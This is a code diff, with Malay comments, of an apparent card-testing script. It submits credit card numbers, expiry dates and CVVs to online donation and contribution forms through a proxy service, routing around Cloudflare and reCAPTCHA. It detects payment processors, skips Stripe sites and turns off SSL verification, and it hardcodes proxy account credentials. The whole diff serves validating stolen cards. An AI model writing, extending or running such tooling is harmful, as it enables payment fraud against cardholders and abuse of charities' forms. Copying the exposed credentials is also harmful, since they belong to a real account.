@@ -28,7 +28,7 @@ class Colors:
 logging.basicConfig(level=logging.INFO, format='%(message)s', datefmt='%H:%M:%S')
 
 VALID_YEARS = list(range(2025, 2036))
-TIMEOUT_SECONDS = 45 # Bright Data Web Unlocker mungkin ambil sikit lama untuk bypass
+TIMEOUT_SECONDS = 45
 
 class IgnoreSSLAdapter(requests.adapters.HTTPAdapter):
     def init_poolmanager(self, *args, **kwargs):
@@ -76,20 +76,17 @@ def get_card_type(ccnum):
     elif ccnum.startswith('6'): return "Discover"
     return "Unknown"
 
-def create_session(proxy_url=None):
+def create_session():
     session = requests.Session()
     session.mount('https://', IgnoreSSLAdapter())
     session.mount('http://', IgnoreSSLAdapter())
     
-    # Setup Bright Data Web Unlocker Proxy
     bd_user = os.environ.get("BRIGHTDATA_USERNAME", "brd-customer-hl_e3d7b03f-zone-web_unlocker1")
     bd_pass = os.environ.get("BRIGHTDATA_PASSWORD", "nlxp7dqlf4r1")
     bd_host = "brd.superproxy.io"
     bd_port = "33335"
     
     brightdata_proxy = f"http://{bd_user}:{bd_pass}@{bd_host}:{bd_port}"
-    
-    # Kita override parameter proxy kalau ada, sebab Web Unlocker kena guna dia punya proxy sendiri
     session.proxies = {"http": brightdata_proxy, "https": brightdata_proxy}
     
     headers = {
@@ -99,11 +96,12 @@ def create_session(proxy_url=None):
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
-        "Cache-Control": "max-age=0"
+        "Cache-Control": "max-age=0",
+        # PENTING: Header ni trigger Web Unlocker untuk bypass Cloudflare + reCAPTCHA
+        "X-BD-Proxy-Active": "1" 
     }
         
     session.headers.update(headers)
-        
     return session
 
 def detect_payment_processor(html):
@@ -183,17 +181,22 @@ def get_form_action_and_payload(session, url):
     try:
         logging.info(f"{Colors.OKCYAN}[*] Requesting site via Bright Data Web Unlocker...{Colors.ENDC}")
         
-        # Web Unlocker akan handle cloudflare & recaptcha secara automatik
         resp = session.get(url, timeout=45, allow_redirects=True)
         
+        # Tambah logging supaya kita nampak apa Bright Data bagi balik
+        logging.info(f"{Colors.OKCYAN}[*] Bright Data Response Status: {resp.status_code}{Colors.ENDC}")
+        
         if resp.status_code != 200 or not resp.text:
+            logging.error(f"{Colors.FAIL}[-] Bright Data returned empty or error. HTML: {resp.text[:200]}{Colors.ENDC}")
             return None, None, None, None, f"Bad HTTP {resp.status_code}"
             
         html = resp.text
         
-        # Web Unlocker selalunya akan inject token recaptcha dalam hidden input
-        # atau kita just hantar je kosong sebab dia dah bypass
-        
+        # Kalau Cloudflare masih block
+        if "Just a moment..." in html or "cf-challenge" in html:
+            logging.error(f"{Colors.FAIL}[-] Cloudflare still blocking via Bright Data.{Colors.ENDC}")
+            return None, None, None, None, "Cloudflare protection"
+            
         processors = detect_payment_processor(html)
         has_authorize = 'authorize' in processors
         if 'stripe' in processors: return None, None, None, None, "Stripe Detected"
@@ -201,7 +204,9 @@ def get_form_action_and_payload(session, url):
         
         soup = BeautifulSoup(html, 'html.parser')
         form = soup.find('form', id=re.compile(r'Main|main|Contribution', re.I)) or soup.find('form', class_=re.compile(r'crm|contribute', re.I)) or soup.find('form')
-        if not form: return None, None, None, None, "Form not found"
+        if not form: 
+            logging.error(f"{Colors.FAIL}[-] Form not found. HTML snippet: {html[:500]}{Colors.ENDC}")
+            return None, None, None, None, "Form not found"
         
         form_action = form.get('action') or re.search(r'<form[^>]*action="([^"]+)"', html).group(1) if re.search(r'<form[^>]*action="([^"]+)"', html) else None
         if form_action and not form_action.startswith('http'): form_action = urljoin(url, form_action)
@@ -213,13 +218,11 @@ def get_form_action_and_payload(session, url):
             if match: qfkey = match.group(1); break
         
         payload = extract_raw_fields(html, soup, form)
-        
-        # Kalau ada hidden input g-recaptcha-response, biarkan Web Unlocker handle
-        # Biasanya Web Unlocker akan auto-isi input ni
 
         return qfkey, form_action, payload, has_authorize, "OK"
         
     except Exception as e:
+        logging.error(f"{Colors.FAIL}[-] Exception in get_form: {str(e)}{Colors.ENDC}")
         error_name = type(e).__name__
         if 'Timeout' in error_name or 'ConnectError' in error_name or 'ConnectionError' in error_name or 'ProxyError' in error_name:
             return None, None, None, None, "BrightData Timed out or Proxy Error"
@@ -474,7 +477,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv):
                 "Upgrade-Insecure-Requests": "1"
             })
 
-            # Kiranya hantar data CC melalui Bright Data jugak
             response = session.post(form_action, data=clean_initial, timeout=45, allow_redirects=True)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
